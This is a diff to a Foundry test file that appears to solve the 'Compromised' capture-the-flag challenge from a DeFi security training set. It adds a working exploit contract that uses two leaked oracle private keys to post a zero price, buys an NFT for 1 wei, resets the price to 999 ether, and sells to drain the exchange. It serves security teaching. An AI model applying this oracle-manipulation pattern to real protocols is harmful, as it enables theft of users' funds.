@@ -9,6 +9,7 @@ import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {IERC721Receiver} from "../../lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";
 
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -75,7 +76,9 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        Attack attacker = new Attack(oracle, exchange, nft, recovery);
+        payable(address(attacker)).transfer(player.balance);
+        attacker.attack();
     }
 
     /**
@@ -94,4 +97,58 @@ contract CompromisedChallenge is Test {
         // NFT price didn't change
         assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
     }
+}
+
+contract Attack is IERC721Receiver, Test {
+    TrustfulOracle oracle;
+    Exchange exchange;
+    DamnValuableNFT nft;
+    address recovery;
+
+    constructor(TrustfulOracle _oracle, Exchange _exchange, DamnValuableNFT _nft, address _recovery) {
+        oracle = _oracle;
+        exchange = _exchange;
+        nft = _nft;
+        recovery = _recovery;
+    }
+
+    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+
+    function attack() external {
+        // Compromised sources
+        uint256 priv1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        uint256 priv2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+        address source1 = vm.addr(priv1);
+        address source2 = vm.addr(priv2);
+
+        // Set the prices to zero lol
+        vm.startPrank(source1);
+        oracle.postPrice("DVNFT", 0);
+        vm.stopPrank();
+
+        vm.startPrank(source2);
+        oracle.postPrice("DVNFT", 0);
+        vm.stopPrank();
+
+        // Buy for ridiculously cheap
+        uint256 id = exchange.buyOne{value: 1}();
+
+        vm.startPrank(source1);
+        oracle.postPrice("DVNFT", 999 ether);
+        vm.stopPrank();
+
+        // Reinflate prices and sell
+        vm.startPrank(source2);
+        oracle.postPrice("DVNFT", 999 ether);
+        vm.stopPrank();
+
+        nft.approve(address(exchange), id);
+        exchange.sellOne(id);
+
+        payable(address(recovery)).transfer(999 ether);
+    }
+
+    receive() payable external {}
 }
